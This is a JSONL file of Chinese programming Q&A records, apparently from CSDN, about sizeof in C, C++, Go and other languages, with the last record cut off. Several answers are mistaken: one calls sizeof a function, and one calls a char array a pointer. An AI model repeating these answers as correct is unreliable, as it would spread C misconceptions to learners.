{"Answer": "在函数中 sizeof(array) == sizeof(void*)， 指针的字节数\r\nsizeof(A[0]) == sizeof(int)， 这里的问题出在sizeof(array)上，在函数中正确使用sizeof(array)必须传递引用\r\n\r\nint sort(int A[],int x) 改为 int sort(int (&amp;A)[10],int x)", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++int数组长度(sizeof(array) / sizeof(array[0]))问题", [" //n个数中选出x\n\n#include<iostream>\nusing namespace std;\n\ntemplate <class T>\n\nint getArrayLen(T& array)\n{\n    return (sizeof(array) / sizeof(array[0]));\n}\n\nint sort(int A[],int x)\n{\n    for(int i=0;i<(sizeof(A)/sizeof(A[0]));i++)\n    {\n        if(A[i]==x)\n        {\n            return i;\n            break;\n        }\n    }\n}\n\nint main()\n{   \n    int A[10]={0,2,3,8,7,9,5,6,4,1};\n    int x=0;\n    cout<<\"请输入要查找的数：\";\n    cin>>x;\n    int k=sort(A,x);\n    cout<<\"A[\"<<k+1<<\"]=\"<<A[k];\n    return 0;\n}\n", "\n\n", "for循环里面的(sizeof(array) / sizeof(array[0]))求数组长度的一直不对，求解答！"]], "Tag": "程序设计"}
{"Answer": "http://blog.csdn.net/maopig/article/details/7243646\r\ndata是一个数组名；该数组没有元素；该数组的真实地址紧随结构体Info之后；这种声明方法可以巧妙的实现C语言里的数组扩展。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["struct sizeof 的问题", ["一：typedef struct S1", "\n{", "\n}S1;", "\n这肯定编译过不了！", "\n\n", "二：typedef struct S2", "\n{", "\n    int b;", "\n    int c;", "\n}S2;", "\n\n", "在main  输出 sizeof(S2)   ", "输出结果是8", "\n\n", "三：typedef struct S3", "\n{", "\n    int b;", "\n    int c;", "\n    char * p;", "\n}S3;", "\nsizeof(S3) **输出 12  **", "\n\n", "四：typedef struct S4", "\n{", "\n    int b;", "\n    int c;", "\n    char s[0];", "\n}S4;", "这时候 sizeof(S4)为什么是8", "？ 而不是12；", "\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;注意几个知识点&amp;#xff1a;&lt;br /&gt;1&amp;#xff1a;sizeof求得是啥&amp;#xff0c;他的参数怎么传递&lt;br /&gt;2&amp;#xff1a;关于结构体的定义&amp;#xff0c;以及结构体的表示方法&amp;#xff0c;struct是可以省略的&amp;#xff0c;以及结构体指针和一个对象的表示方法&lt;br /&gt;3&amp;#xff1a;要知道指针的概念&amp;#xff0c;指针和地址的关系&amp;#xff0c;而计算机对指针&amp;#xff0c;也就是存地址的变量&amp;#xff0c;都是4字节大小&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/600735390746190.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["结构体指针 sizeof问题", ["#", "include", "<bits/stdc++.h>", "\nusing namespace std;\n \n", "typedef", " ", "struct", " _", "id", "{\n    ", "int", " a;\n}", "id", ",*idd;\n\n", "int", " main() {\n    ", "id", "* x,*y,*z,*k;\n    x = (idd)malloc(", "sizeof", "(", "struct", " _", "id", "));\n    y = (idd)malloc(", "sizeof", "(_", "id", "));\n    z = (idd)malloc(", "sizeof", "(", "id", "));\n    k = (idd)malloc(", "sizeof", "(idd*));\n    cout<<", "sizeof", "(x)<<", "sizeof", "(y)<<", "sizeof", "(z)<<", "sizeof", "(k); \n}\n\n", "\n", "请问大家sizeof后面写的这四个参数是一个意思吗", "id是一个结构体 idd是结构体指针 _id是一个标识符", "后面写这四个都是可以的嘛 为什么最后结果都是8呀 "]], "Tag": "程序设计"}
{"Answer": "sizeof 在计算变量所占空间大小时，括号可以省略，而计算类型(模子)大小时不能省略", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于sizeof，malloc和gcc的一个报错", ["这是一个C程序，当我用gcc -Werror test.c进行编译时，gcc报错：", "\n\n", " test.c: In function ‘InitList’:\ntest.c:20:59: error: expected expression before ‘tItemType’\n             tItemType *data = (tItemType *)malloc((sizeof tItemType) * LIST_MAX\n", "\n\n", "代码如下：", "\n\n", " #include <stdlib.h>\n#include <stdbool.h>\n\n#define LIST_MAX_LEN 129\ntypedef int tItemType;\ntypedef struct List\n{\n    tItemType*      data;\n    unsigned int    length;\n} tList;\n\nbool InitList(tList *l)\n{\n        if (l == NULL)\n        {\n            return false;\n        }\n        else\n        {\n            tItemType *data = (tItemType *)malloc((sizeof tItemType) * LIST_MAX_LEN);\n            if (data == NULL)\n            {\n                return false;\n            }\n            else\n            {\n                l->data = data;\n                l->length = 0;\n            }\n        }\n}\n\nint main(int argc, char *argv[])\n{\n        tList l;\n\n        return 0;\n}\n\n", "\n\n", "但是，当我把malloc那条语句改成", "\n\n", " tItemType *data = (tItemType *)malloc((sizeof(tItemType)) * LIST_MAX_LEN);\n", "\n\n", "时，也就是将tItemType用括号抱起来之后，gcc没有再报错。这是为什么呢？", "\nsizeof是C语言的一个关键字，sizeof tItemType和sizeof(tItemType)应该是没有区别的。这到底是怎么回事呢？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof指针的时候并不是得到指针所指向内存的大小&amp;#xff0c;而是指针本身占用空间的大小&amp;#xff0c;64位操作系统的指针占用8个字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么改变输入而sizeof(a)不变呢", ["\n", "\n", "不论输入的number是多少，sizeof（a）都是8，为什么呢，sizeof（a）输出不应该是number*4的值吗"]], "Tag": "程序设计"}
{"Answer": "java之所以不需要sizeof运算符，是因为，java里面，类型的长度是固定的，而不像C语言。\r\n在C语言里，turbo c的int是2字节，vc++6.0是4字节，所以才需要sizeof。\r\n好比蒸汽机车上有锅炉，而电气火车没有，你完全没有必要非要在电气火车上也放一个锅炉。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["java中是没有sizeof函数，请问如果一定要用java完成这个问题 要怎么做呢", []], "Tag": "程序设计"}
{"Answer": "数组传参会退化成指针，在32位机上你sizeof(str)恒为4\r\n具体参考：http://blog.csdn.net/foreverhuylee/article/details/38333101", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof算出的数组大小怎么不对呢？", ["在调用match和chang函数的时候sizeof（str）-1为3这是为什么？", "\n\n", " #include<iostream>\nusing namespace std;\n#define ok 1\n#define no 0\n#define error 0\n#define yes 1\n#define maxsize 50\nstruct sqstack//定义一个顺序栈\n{\n    char data[maxsize];\n    int top, bottom;\n};\nstruct sqqueue//定义一个顺序队列\n{\n    char data[maxsize];\n    int front, rear;\n};\nint initstack(sqstack &s)//初试化栈\n{\n    s.bottom = s.top = -1;\n    return ok;\n}\nint initqueue(sqqueue &q)//初始化队列\n{\n    q.front = q.rear = 0;\n    return ok;\n}\nint stack_isempty(sqstack s)//判栈空\n{\n    if (s.bottom == s.top)\n        return yes;\n    else\n        return no;\n}\nint queue_isempty(sqqueue q)//判队空\n{\n    if (q.front == q.rear)\n        return yes;\n    else\n        return no;\n}\nint stack_isfull(sqstack s)//判栈满\n{\n    if (s.top-s.bottom>=maxsize)\n        return yes;\n    else\n        return no;\n}\nint queue_isfull(sqqueue q)//判队满\n{\n    if ((q.rear+1)%maxsize==q.front)\n        return yes;\n    else\n        return no;\n}\nint push(sqstack &s, char x)//入栈\n{\n    if (stack_isfull(s))\n        return error;\n    else\n    {\n        s.data[++s.top] = x;\n        return ok;\n    }\n}\nint pop(sqstack &s, char &x)//出栈\n{\n    if (stack_isempty(s))\n        return error;\n    else\n    {\n        x = s.data[s.top--];\n        return ok;\n    }\n}\nint gettop(sqstack s, char &x)//取栈顶元素\n{\n    if (stack_isempty(s))\n        return error;\n    else\n    {\n        x = s.data[s.top];\n        return ok;\n    }\n}\nint enqueue(sqqueue &q, char x)//进队\n{\n    if (queue_isfull(q))\n        return error;\n    else\n    {\n        q.data[q.rear] = x;\n        q.rear = (q.rear + 1) % maxsize;\n            return ok;\n    }\n}\nint dequeue(sqqueue &q, char &x)//出队\n{\n    if (queue_isempty(q))\n        return error;\n    else\n    {\n        x=q.data[q.front];\n        q.front = (q.front + 1) % maxsize;\n        return ok;\n    }\n}\nint priority(char x)//判断优先级\n{\n    int n=0;\n    switch (x)\n    {\n    case '+':n = 3; break;\n    case '-':n = 3; break;\n    case '*':n = 5; break;\n    case '/':n = 5; break;\n    case '(':n = 1; break;\n    case ')':n = 6; break;\n    default: break;\n    }\n    return n;\n}\n/*括号匹配思想\n从左到右依次扫描每个元素\n（1）如果是左括号，直接入栈；\n（2）如果是右括号，则出栈，若出栈的是左括号；则该右括号匹配成功；否则括号匹配失败；\n（3）扫描完成后若栈空，匹配成功；否则匹配失败；\n*/\nint match(char str[])\n{\n    int i; int n = sizeof(str)-1; char x;\n    sqstack s; initstack(s);\n    for (i = 0; i < n; i++)\n    {\n        switch (str[i])\n        {\n        case '(':push(s, str[i]); break;\n        case ')':pop(s, x); if (x = '(') break; else return error;\n        default:break;\n        }\n    }\n    if (stack_isempty(s))\n        return ok;\n    else\n        return error;\n\n}\n/*中缀转后缀表达式：\n 从左到右依次扫描每个元素\n（1）如果是左括号，直接入栈；\n（2）如果是右括号，则将栈中左括号以及之上的元素依次出栈，如果出栈的元素不是左括号，则加入后缀表达式中（这里用队列来存储，也可以直接输出）；\n（3）如果是其他运算符，如果该操作符优先级比栈顶元素高则直接入栈；否则，依次出栈，加入后缀表达式中，直到如果该操作符优先级比栈顶元素高或者栈空为止；将该元素入栈，（设左括号优先级小于任何操作符）；\n（4）如果是操作数直接加入后缀表达式（这里用队列来存储，也可以直接输出）*/\nint chang(char str[])\n{\n    int i; char x; int n = sizeof(str)-1;\n    sqstack s; initstack(s);\n    sqqueue q; initqueue(q);\n    for (i = 0; i < n; i++)//从左到右依次扫描\n    {\n        if (str[i] == '(')//如果是左括号直接入栈，然后扫描下一个元素\n            if (push(s, str[i]))\n                continue;\n            else\n                return error;\n        else if (str[i] == ')')//如果是右括号，则将左括号之上的元素出栈，依次入队，然后将括号出栈\n        {\n            while (!stack_isempty(s))\n            {\n                pop(s, x);\n                if (x != '(')\n                    enqueue(q, x);\n                else\n                    break;\n            }\n            continue;\n        }\n        else if (str[i] == '+' || str[i] == '-' || str[i] == '*' || str[i] == '/')//如果是四则运算的符号\n        {\n            if (gettop(s, x))//如果栈不为空，取出栈顶元素\n                if (priority(str[i]) > priority(x))//如果当然元素优先级别大于栈顶元素的优先级别，则入栈\n                {\n                    if (push(s, str[i]))\n                        continue;\n                }\n                else\n                {\n                    while (!stack_isempty(s) && priority(str[i]) <= priority(s.data[s.top]))//否则将优先级高于或等于当前运算符的栈顶元素依次出栈并入队，直到栈顶元素优先级比自己低或者遇到左括号为止\n                    {\n                        pop(s, x);\n                        enqueue(q, x);\n                    }                           \n                    push(s, str[i]);    \n                    continue;\n\n                }\n            else//如果栈空，则直接入栈\n            {\n                push(s, str[i]);\n                continue;\n            }\n        }\n        else//如果是操作数则直接进队\n        {\n            enqueue(q, str[i]);\n                continue;\n        }\n    }\n    while (!stack_isempty(s))//扫描完成后将栈中剩余的操作符依次入队\n    {\n        pop(s, x);\n        enqueue(q, x);\n    }\n    while (!queue_isempty(q))//输出后缀表达式\n    {\n        dequeue(q, x);\n        cout << x;\n    } \n    return ok;\n}void main()\n{\n    char str[] = \"a+b-a*((c+d)/e-f)+g\";\n    if (match(str))\n        chang(str);\n    else\n        cout << \"表达式括号不匹配，请重新输入\";\n}\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;在c中&amp;#xff0c;数组在作为参数的时候就退化为指针&amp;#xff0c;对一个地址来取大小呢&amp;#xff0c;如果是32位系统的话即为4&amp;#xff0c;如果是64位系统的话为8&amp;#xff0c;所以呢&amp;#xff0c;在函数中sizeof获取的是指针的长度而不是数组的长度。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c中为什么int数组传到函数之后sizeof(数组)就变成8了", ["\n", "请帮忙解答一下，为什么在函数里sizeof(A)会等于8：", "#include<stdio.h>", "int SumOfElement(int A[]){", "    printf(\"in SumOfElement size of sizeof(A) is %d\\tsize of sizeof(A[0]) is %d\\n\",sizeof(A),sizeof(A[0]));", "}", "int main()", "{", "    int A[]={5,6,8,4,2};", "    int total=SumOfElement(A);", "    printf(\"in main size of sizeof(A) is %d\\tsize of sizeof(A[0]) is %d\\n\",sizeof(A),sizeof(A[0]));", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;当然会出错&amp;#xff0c;如果你去调试你就会发现你的length不会等于数组的长度&amp;#xff01;&lt;br /&gt;那是因为你函数传进来的数组会退化为指针&amp;#xff0c;也就意味着sizeof计算的是指针的大小&amp;#xff0c;而非整个数组的大小&lt;br /&gt;length的计算最好放在主函数&amp;#xff0c;算出了后再将length传入要用的函数。&lt;br /&gt;一定要学会如何调试&amp;#xff01;非常重要&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言sizeof求数组长度出错", ["为什么这个调试用sizeof在这里发生了错误", "我是用int a[1]＝{5}来试的", "\n", "\n", "#include<stdio.h>\n", "int", " left_bound(", "int", " nums[],", "int", " target){\n    ", "int", " length_nums=sizeof(nums)/sizeof(nums[", "0", "]);\n    ", "if", "(length_nums==", "0", ")  return -", "1", ";\n    ", "int", " ", "left", "=", "0", ";\n    ", "int", " ", "right", "=length_nums;    //右开区间\n    \n    while(", "left", "<", "right", ")    //因为是左闭右开区间，若", "left", "=", "right", "查找结束 \n    {\n        ", "int", " ", "mid", "=(", "left", "+(", "right", "-", "left", "))/", "2", ";//防止溢出 \n        ", "if", "(nums[", "mid", "]==target)  ", "right", " =", "mid", ";//要找到右侧相等的数 如上图 \n                                          //原来写法是return ", "mid", "; \n        else ", "if", "(nums[", "mid", "]<target)  ", "left", "=", "mid", "+", "1", ";\n        else ", "if", "(nums[", "mid", "]>target)  ", "right", " =", "mid", "; \n     }\n     \n     ", "if", "(", "left", "==length_nums||nums[", "left", "]!=target)  return -", "1", ";  //     检查出界情况     \n     return ", "left", ";    //退出的时候", "left", "=", "right", " \n     \n}\n", "int", " main(){\n    ", "int", " a[", "1", "]={", "5", "};\n    printf(", "\"%d\"", ",left_bound(a,", "5", "));\n    \n}\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;因为p是int 是个地址数&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个malloc这一项为什么sizeof是4哇", ["\n ", "char", " str[] = ", "\"world\"", "; cout << ", "sizeof", "(str) << ", "\": \"", ";", "//6", "\n    ", "char", " *p    = str;     cout << ", "sizeof", "(p) << ", "\": \"", ";", "//4", "\n    ", "char", " i     = ", "10", ";      cout << ", "sizeof", "(i) << ", "\": \"", ";", "//1", "\n    ", "void", " *pp   = malloc(", "10", ");  cout << ", "sizeof", "(p) << endl;", "//4", "\n", "\n", "   void *pp   = malloc(10);  cout << sizeof(p) << endl;//4为什么是4"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;4&amp;#xff0c;这是求字节数&amp;#xff0c;VC&amp;#43;&amp;#43;中c&amp;#43;&amp;#43;给一般整型分配4个字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof（2）的输出值为？", ["sizeof（2）的输出值为？sizeof（2）的输出值为？sizeof（2）的输出值为？sizeof（2）的输出值为？sizeof（2）的输出值为？"]], "Tag": "程序设计"}
{"Answer": "http://segmentfault.com/q/1010000000801175/a-1020000000925625\r\ngcc的规定", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言sizeof操作符的问题", ["sizeof后面加函数名为什么结果会是1，求大神详细讲解原因，不要说不能加，因为编译运行出来了结果啊，总有原因的"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;它不是变量&amp;#xff0c;所以也谈不上合不合法。它是个函数&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问sizeof是合法变量吗", ["请问sizeof是合法变量吗"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;初始化数组a,每个元素的值为ASCII值0&lt;br /&gt;memset(a,0,sizeof(a));&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["代码中memset（a，0，sizeof（a））是什么意思", ["#include<stdio.h>", "#include<string.h>", "int main()", "{", "    char s[200];", "    int a[200];", "    int i,len,max,k;", "    while(gets(s))", "    {", "        memset(a,0,sizeof(a));", "        k = 0;", "        max = 0;", "        len = strlen(s);", "        for(i = 0; i < len; i++)", "        {", "            if(s[i] == ' ')", "                continue;", "            a[s[i]]++;", "        }", "        for(i = 0; i < 200; i++)", "        {", "            if(max < a[i])", "            {", "                max = a[i];", "                k = i;", "            }", "        }", "        printf(\"%c %d\",k,max);", "        printf(\"\\n\");", "    }", "    return 0;", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;pre&gt;&lt;code&gt;import unsafe \"unsafe\"\n\n/* Structure describing an inotify event.  */\ntype INotifyInfo struct {\n    Wd     int32  // Watch descriptor\n    Mask   uint32 // Watch mask\n    Cookie uint32 // Cookie to synchronize two events\n    Len    uint32 // Length (including NULs) of name\n}\n\nfunc doSomething() {\n    var info INotifyInfo\n    const infoSize = unsafe.Sizeof(info)\n    ...\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; The OP is mistaken. The unsafe.Sizeof does return 24 on the example Coord3d struct. See comment below.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Go中的sizeof结构", ["\n\n", "I'm having a look at Go, which looks quite promising.\nI am trying to figure out how to get the size of a go struct, for\nexample something like", "\n\n", "type Coord3d struct {\n    X, Y, Z int64\n}\n", "\n\n", "Of course I know that it's 24 bytes, but I'd like to know it programmatically..", "\n\n", "Do you have any ideas how to do this ?", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你是在64位系统下的&lt;br /&gt;输出依次为&amp;#xff1a;&lt;br /&gt;1&lt;br /&gt;2&lt;br /&gt;4&lt;br /&gt;8&lt;br /&gt;4&lt;br /&gt;8&lt;/p&gt;\n&lt;p&gt;1补全为4&amp;#xff0c;2补全为4 所以 4 &amp;#43; 4 &amp;#43; 4 &amp;#43; 8 &amp;#43; 4 &amp;#43; 8 &amp;#61; 32&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["想问一下最后语句sizeof(struct A)为什么等于32？按照结构体内存字节对齐原则不应该3*8=24位就足够了吗？", ["#include <stdio.h>", "struct A {", "short s;", "int i;", "long l;", "float f;", "char c;", "double d;", "};", "int main ()", "{", "printf(\"%d\\n\", sizeof(char));", "printf(\"%d\\n\", sizeof(short));", "printf(\"%d\\n\", sizeof(int));", "printf(\"%d\\n\", sizeof(long));", "printf(\"%d\\n\", sizeof(float));", "printf(\"%d\\n\", sizeof(double));", "printf(\"%d\\n\", sizeof(struct A));", "return 0;", "}"]], "Tag": "程序设计"}
{"Answer": "#include &lt;iostream&gt;\r\n#include &lt;string&gt;\r\nusing namespace std;\r\nint main()\r\n{\r\n\tstring a = \"qqq\";\r\n\tcout &lt;&lt; a.size(); //3\r\n\tcout &lt;&lt; sizeof(a);//28\r\n\tcout &lt;&lt; a.length();//3\r\n\t//cout &lt;&lt; strlen((char *)a);\r\n\tcout &lt;&lt; \"sizeof(string)=\" &lt;&lt; sizeof(string) &lt;&lt; endl;//28\r\n\treturn 0;\r\n}\r\n在VS2013下面运行 C++里面的String类的大小占28个字节", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["问一下.size , sizeof (),strlen , length的区别", ["定义string a=“sss”;", "\n用. size 为3", "\nsizeof是24", "\nstrlen是3", "\nlength是3", "\n问一下为什么有的没有读\\0，而且sizeof为24"]], "Tag": "程序设计"}
{"Answer": "fgets(line,(sizeof line / sizeof line[0]),stdin);\r\n将stdin，也就是键盘输入的内容读取到line变量，缓冲区数组长度是(sizeof line / sizeof line[0])，也就是整个数组的字节数除以一个字符的字节数。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["fgets和sizeof的用法问题", ["//删除字符串中的特殊字符", "\n#include ", "\nvoid main()", "\n{", "\n    char line[150];", "\n    int i, j;", "\n    printf(\"输入一个字符串：\");", "\n    fgets(line,(sizeof line / sizeof line[0]),stdin);//这一句代码是什么意思？", "\n    for(i=0; line[i] !='\\0'; i++)", "\n    {", "\n        while (!((line[i] >= 'a' && line[i] <= 'z') || (line [i] >= 'A' && line[i] <= 'Z') || line[i]=='\\0'))", "\n        {", "\n            for(j=i; line[j] != '\\0'; j++)", "\n            {", "\n                line[j] = line[j+1];", "\n            }", "\n            line[j]='\\0';", "\n        }", "\n    }", "\n    printf(\"输出：\");", "\n    puts(line);", "\n}"]], "Tag": "程序设计"}
{"Answer": "因为 a是一个指针，指针也就是一个地址，占四个字节", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["char*a=malloc(sizeof(char)*1024); sizeof(a) a为什么是4", ["RT！", "\nchar ", "a = (char", ")malloc(sizeof(char) * 1024);", "\nprintf(\"%d\\n\", sizeof(a));", "\na为什么会是4啊？", "\nchar如果按1B算 结果应该是1024B才对啊。", "\n如果申请失败了，a[1000]='c';  这句话却是成功的。", "\n在下系统win10 64。", "\n蒙了......."]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;strong&gt;报错信息提示你用的%lu和后面打印的数据类型不一致导致的&lt;/strong&gt;&amp;#xff0c;你在vscode运行c与视频老师运行环境不一样&amp;#xff0c;&lt;u&gt;编译器的问题&lt;/u&gt;&amp;#xff0c;如何解决呢 一种就是换格式控制符 第二种 类型转换 &amp;#xff0c;相对第一种简单点也就是你用的那种&amp;#xff0c;假如回答满意&amp;#xff0c;点个采纳&amp;#xff0c;谢谢&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么C语言中printf里面用不了sizeof（）或strlen（）之类后边用括号的函数？", ["为什么这段代码运行会出错而我看的视频中代码不出错", "\n\n", "如下", "\n\n", "这是我写的", "\n\n", "\n\n", "这是视频中的", "\n\n", "\n\n", "如果像下面一样写把%lu改成%d并且把strlen与printf分离开就好使了", "\n\n", " ", "\n\n", "\n", "#include <stdio.h>\n#include<string.h>\nint main(void)\n{\n    char i[20];\n    scanf(\"%s\",i);\n    int o=strlen(i);\n    printf(\"%d\",o);\n    return 0;\n}", "\n\n", "\n\n", "我的问题如标题求大佬解答"]], "Tag": "程序设计"}
{"Answer": "printf(\"%d/n\",sizeof(aaaaa) / sizeof(int));", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言用sizeof求数组长度，为什么结果不对？", ["int aaaaa[10];", "\nprintf(\"%d/n\",sizeof(aaaaa));", "\n结果是40？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;当然选择a&amp;#xff0c;a不能&amp;#xff0c;a是指针&amp;#xff0c;b是最标准的计算出一个char型数据所占字节数的代码&lt;/p&gt;\n&lt;p&gt;我补充下&lt;br /&gt;sizeof 是运算符&amp;#xff0c;不是函数&amp;#xff0c;所以是编译器去直接计算的&amp;#xff0c;不是运行的时候计算的。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["计算机二级C语言问题", ["设有定义：char p[] ={'1' ,   '2',       '3'},*q=p;，以下不能计算出一个char型数据所占字节数的表达式是（A）.", "A.sizeof(p)", "B.sizeof(char)", "C.sizeof(*q)", "D.sizeof(p[0])", "\n", "问题：为什么答案不是B啊，这个B选项里面就一个char，什么也没有，这还怎么用sizeof计算一个char类型数据呢？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof返回的是字节长度&amp;#xff0c;具体结构看看呢&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Sizeof返回的是字节长度吗？", ["我在dsp 28335的芯片上，采用sizeof计算一个结构体的长度，里面定义了四个八位的变量和四个三十二位的变量，sizeof打印出来的数据是12，请问这是怎么回事？字节对齐也应该是按八位的来，sizeof计算的好像是字节数，怎么算都不对啊。请大神指导下。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你的传参int index[]等价于int*index&lt;br /&gt;是个指针&lt;br /&gt;c语言中&amp;#xff0c;当一维数组作为函数参数的时候&amp;#xff0c;编译器总是把它解析成一个指向其首元素首地址的指针。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么c语言sizeof(数组名)算出是一个指针的字节", ["\n", "如上图，具体实现功能见for循环；", "本来，我是秉承着算法应有一定的韧性，所以写了画线这句，目的就是规范n的输入，但是结果却是如下", "\n", "\n", "于是，我便想知道哪里出错了，遂取消return，写了输出sizeof(index)的函数，结果如下", "\n", "\n", "我的结果最后一个便是sizeof(index)的字节数，8不就是一个指针的字节吗，这里求得的结果不应该是", "4*6吗？？想知道哪里出错了，感谢！（代码在下面）", "\n", "#include \"allinclude.h\"", "void printName(stuType student[], int index[], int n)", "{  // Add your code here", "if(n!=sizeof(index)/sizeof(index[0]))  ;", "\n", "int i;", "for(i=0;i<n;i++)", "{", "  printf(\"%s\\n\",student[index[i]].name);", "}", "    printf(\"%d\\n\",sizeof(index));", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "这种写法很常见的，sizeof（a）如果a是数组，这是整个数组的字节长度，这里返回的是5，如果写成sizeof(a[0])则是返回1,也就是数组单个元素的长度。\r\n也就是说，你的第二行如果写成memset(a, 0, sizeof(a[0]) * 5);也是和第一行等价的。\r\n如果这里数组类型不是char而是int (假设在32位系统上)这返回的是5*4=20字节。单个元素就是4字节长度。\r\n你要记住的是sizeof返回的是字节长度。\r\n给你一点扩展知识，有时候还会碰到sizeof（char）或者sizeof（int） sizeof（unsigned int）这种写法，里面放的是类型。也是可以的，分别为1 4 4 \r\n也就是类型所占字节的长度。更多地方还会在里面放结构体类型。如sizeof(struct node).这表示的是该结构体变量所占的字节大小.\r\n如果我的回答对你有帮助，请您采纳！不懂的可以继续问我。\r\n一枚上班还在偷偷答疑的“敬业”的程序员", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c/c++关于memset和sizeof的问题", [" char a[5];\n memset(a, 0, sizeof(a));\n", "\n\n", "我知道这条语句可以把数组a清零，但是sizeof(a)不是只把前8位清零了嘛，后面的32位应该没变啊，不是应该写成这样才对吗", "\n\n", " char a[5];\n memset(a, 0, sizeof(a) * 5);\n\n", "\n\n", "是不是原理类似于int a[5] = {0};有些编译器会自动把后面的补0"]], "Tag": "程序设计"}
{"Answer": "http://bbs.csdn.net/topics/40426408", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["vb编程系统中有没有类似vc编程系统的sizeof一样的函数可以求一个数组类型的大小？", ["vb编程系统中有没有类似vc编程系统的sizeof一样的函数可以求一个数组类型的大小？怎么求数组的元素的类型大小？"]], "Tag": "程序设计"}
{"Answer": "1.sizeof不是函数，在编译的时候，编译器就求出了对应数据结构的大小。\r\n2.至于是否支持sizeof(XXX::strname)，完全取决于编译器，在早期的c++中是不支持的，现在已经支持了。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof（） 如何得到C++类/结构中成员所占空间大小???", ["！！！！请勿答非所问 ！！！！！", "\n\n", "简要如下：", "\n\n", "struct XXX", "\n{", "\n....", "\n...", "\nchar strname[****];", "\n...", "\n\n", "void funxx()", "\n    {", "\n                int iix = sizeof(strname);//这里没问题，问题在下面", "\n    }", "\n};", "\n\n", "int main()", "\n{", "\n\n", "XXX var;\nint iix2 = sizeof(var.strname);//这也可以，\n", "\n\n", "//问题在这里，如何不创建类的实例，也不在类的函数中得到成员空间大小 !!!", "\n\n", "int iix = sizeof(XXX::strname);//VC6编译错误，为何？？？？，如何解决？？？"]], "Tag": "程序设计"}
{"Answer": "`#define`不能定义变量，只能定义常量。等到ObjectC编译的时候它已经被20代替了，所以不能改变FINGER_SIZE的值。\r\n\r\n你应该用全局变量，在最开始声明：\r\n\r\n    extern NSUInteger FINGER_SIZE;\r\n\r\n在m.文件里定义：\r\n\r\n    NSUInteger FINGER_SIZE= 20;\r\n\r\n这样就有了可赋值的变量，可以修改。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["#define SIZEOF Xcode", ["我要做一个Xcode工程，UIView.h中的代码如下：", "\n\n", "#define FINGER_SIZE20\n", "\n\n", "如何在另一个UIView中修改FINGER_SIZE的值？", "\n\n", "然后在SecondView和UIButton中：", "\n\n", " -(IBAction)changeSize{//*****}\n", "\n\n", "其中changSize是在SecondView中， ", "#define FINGER_SIZE 20", "在", "UIView.h", "中。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;code class=\"language-javascript\"&gt;sizeof&lt;/code&gt;运算符不是函数&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;sizeof&lt;/code&gt;语法是&lt;code class=\"language-javascript\"&gt;sizeof(type)&lt;/code&gt;或&lt;code class=\"language-javascript\"&gt;sizeof expression&lt;/code&gt;&amp;#xff0c;在编译阶段编译器直接把&lt;code class=\"language-javascript\"&gt;sizeof&lt;/code&gt;表达式替换成相应常量。&lt;br /&gt;&lt;a href=\"https://en.cppreference.com/w/c/language/sizeof\" id=\"textarea_1647576993362_1647577460143_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://en.cppreference.com/w/c/language/sizeof&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": 